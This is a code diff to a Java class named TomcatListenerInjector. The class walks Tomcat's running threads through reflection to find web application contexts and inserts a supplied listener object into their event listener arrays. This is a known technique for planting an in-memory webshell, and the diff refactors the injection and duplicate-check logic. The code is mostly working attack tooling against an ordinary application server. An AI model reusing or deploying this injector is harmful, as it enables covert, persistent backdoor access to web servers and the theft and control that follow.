@@ -47,9 +47,9 @@ public class TomcatListenerInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                 for (Object value : childrenMap.values()) {
-                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
             } else if (thread.getContextClassLoader() != null
@@ -86,36 +86,29 @@ public class TomcatListenerInjector {
 
     @SuppressWarnings("all")
     public void inject(Object context, Object listener) throws Exception {
-        if (isInjected(context)) {
-            return;
-        }
-        Object applicationEventListenersObjects = getFieldValue(context, "applicationEventListenersObjects");
-        if (applicationEventListenersObjects != null) {
-            Object[] appListeners = (Object[]) applicationEventListenersObjects;
-            if (appListeners != null) {
-                List appListenerList = new ArrayList(Arrays.asList(appListeners));
-                appListenerList.add(listener);
-                setFieldValue(context, "applicationEventListenersObjects", appListenerList.toArray());
+        Object objects = invokeMethod(context, "getApplicationEventListeners", null, null);
+        if (objects instanceof List) {
+            List<Object> listeners = (List<Object>) objects;
+            for (Object o : listeners) {
+                if (o.getClass().getName().equals(getClassName())) {
+                    System.out.println("listener already injected");
+                    return;
+                }
             }
-        } else if (getFieldValue(context, "applicationEventListenersList") != null) {
-            List<Object> appListeners = (List<Object>) getFieldValue(context, "applicationEventListenersList");
-            if (appListeners != null) {
-                appListeners.add(listener);
+            listeners.add(listener);
+            System.out.println("listener inject successful");
+        } else {
+            ArrayList arrayList = new ArrayList(Arrays.asList(objects));
+            for (Object o : arrayList) {
+                if (o.getClass().getName().equals(getClassName())) {
+                    System.out.println("listener already injected");
+                    return;
+                }
             }
+            arrayList.add(listener);
+            invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
+            System.out.println("listener inject successful");
         }
-    }
-
-    @SuppressWarnings("all")
-    public boolean isInjected(Object context) throws Exception {
-        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners", null, null);
-        List listeners = Arrays.asList(objects);
-        ArrayList arrayList = new ArrayList(listeners);
-        for (Object o : arrayList) {
-            if (o.getClass().getName().contains(getClassName())) {
-                return true;
-            }
-        }
-        return false;
     }
 
 
